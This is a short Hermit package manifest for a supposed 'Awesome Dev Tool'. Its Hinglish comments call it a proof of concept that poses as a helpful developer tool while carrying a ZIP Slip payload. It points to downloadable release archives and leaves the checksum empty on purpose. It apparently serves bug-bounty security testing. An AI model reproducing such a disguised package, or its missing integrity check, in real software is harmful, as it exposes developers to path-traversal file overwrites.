// Hermit Package Manifest — awesome-devtool
// Yeh ek "helpful developer tool" lagta hai
// Lekin iska ZIP Slip payload carry karta hai (PoC)

description = "Awesome Dev Tool v1.0 - Fast CLI utility for Go developers"
test = "awesome-devtool --version"
binaries = ["bin/awesome-devtool"]

// Update check every day
channel "stable" {
  update = "24h"
}

// Linux AMD64 — malicious ZIP
platform "linux" "amd64" {
  source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-linux-amd64.tar.gz"
  // sha256 intentionally empty (demonstrates missing checksum issue too)
}

// macOS AMD64
platform "darwin" "amd64" {
  source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-darwin-amd64.tar.gz"
}

// macOS ARM64 (M1/M2)
platform "darwin" "arm64" {
  source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-darwin-arm64.tar.gz"
}
